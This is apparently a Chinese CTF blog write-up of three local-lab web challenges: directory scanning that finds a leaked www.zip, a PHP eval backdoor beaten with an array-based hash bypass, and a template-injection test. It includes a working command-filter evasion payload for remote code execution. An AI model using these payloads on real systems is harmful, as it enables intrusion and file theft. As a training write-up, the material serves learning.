---
title: 'Week2 Web 网络攻防'
date: '2025-04-23T20:32:27+08:00'
weight: 
draft: false
description: 'Week2 Web 网络攻防'
---

## 遗失的拉链

**提示：Pangbai 的拉链找不到了 你可以帮他找到他的拉链吗**

根据提示拉链应该与 `zip` 有关，这里说拉链找不到了，可以使用 dirsearch 进行目录扫描查找与 `zip` 相关的内容

```shell
python dirsearch.py -u 127.0.0.1:3307
```

扫描结果：

```shell

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: C:\Users\puppy\Desktop\dirsearch-0.4.3\reports\_127.0.0.1_3307\_25-04-24_09-08-17.txt

Target: http://127.0.0.1:3307/

[09:08:18] Starting:
[09:08:24] 403 -  276B  - /.ht_wsr.txt
[09:08:24] 403 -  276B  - /.htaccess.save
[09:08:24] 403 -  276B  - /.htaccess.sample
[09:08:24] 403 -  276B  - /.htaccess.orig
[09:08:24] 403 -  276B  - /.htaccess.bak1
[09:08:24] 403 -  276B  - /.htaccess_extra
[09:08:24] 403 -  276B  - /.htaccessBAK
[09:08:24] 403 -  276B  - /.htaccess_orig
[09:08:24] 403 -  276B  - /.htaccess_sc
[09:08:24] 403 -  276B  - /.htaccessOLD2
[09:08:24] 403 -  276B  - /.htaccessOLD
[09:08:24] 403 -  276B  - /.html
[09:08:24] 403 -  276B  - /.htm
[09:08:24] 403 -  276B  - /.htpasswd_test
[09:08:24] 403 -  276B  - /.httr-oauth
[09:08:24] 403 -  276B  - /.htpasswds
[09:08:58] 200 -  861B  - /index.html
[09:09:17] 200 -    3KB - /server-status/
[09:09:17] 200 -    3KB - /server-status
[09:09:32] 200 -    1KB - /www.zip

Task Completed
```

访问 `127.0.0.1:3307/www.zip`，下载解压后得到 `pizwww.php`

```php
<?php
error_reporting(0);
//for fun
if(isset($_GET['new'])&&isset($_POST['star'])){
    if(sha1($_GET['new'])===md5($_POST['star'])&&$_GET['new']!==$_POST['star']){
        //欸 为啥sha1和md5相等呢
        $cmd = $_POST['cmd'];
        if (preg_match("/cat|flag/i", $cmd)) {
            die("u can not do this ");
        }
        echo eval($cmd);
    }else{
        echo "Wrong";

    } 
}
```

![pizwww](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/pizwww.8dx3cv51r2.webp)

使用 `GET` 方式传入 `new[]=1`，`POST` 方式传入 `star[]=2&cmd=system("ca$(echo t) /fla$(echo g)");`

![PixPin_2025-05-09_20-38-25](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-38-25.6pnq5j5elj.webp)

获得 `flag`：`flag{32cba65e-2c30-0a97-726c-fc7317e00cb3}`

## 你能在一秒内打出八句英文吗

使用 Python 的 request 模块模拟请求

```Python
import requests
from bs4 import BeautifulSoup

start_url = "http://127.0.0.1:3307/start"
submit_url = "http://127.0.0.1:3307/submit"

session = requests.Session()
start_response = session.get(start_url)

soup = BeautifulSoup(start_response.text, "lxml")
element = soup.find('p', {'id': 'text'})
text = element.get_text()

payload = {'user_input' : text}
response = session.post(submit_url, data=payload)

with open('response_text/你能在一秒钟打出八句英文吗.html', 'w', encoding='utf-8') as f:
    f.write(response.text)

print('Success')
```

## 复读机

输入 `{{1+1}}` 输出 `2`，判断存在模板注入

https://github.com/Puppy1599/picx-images-hosting/raw/master/Typora/networkSecurity/PixPin_2025-05-16_23-23-55.wis6ehwd3.webp

尝试使用焚靖绕过，获得 flag

https://github.com/Puppy1599/picx-images-hosting/raw/master/Typora/networkSecurity/PixPin_2025-05-16_23-26-08.1vyvjkncih.webp

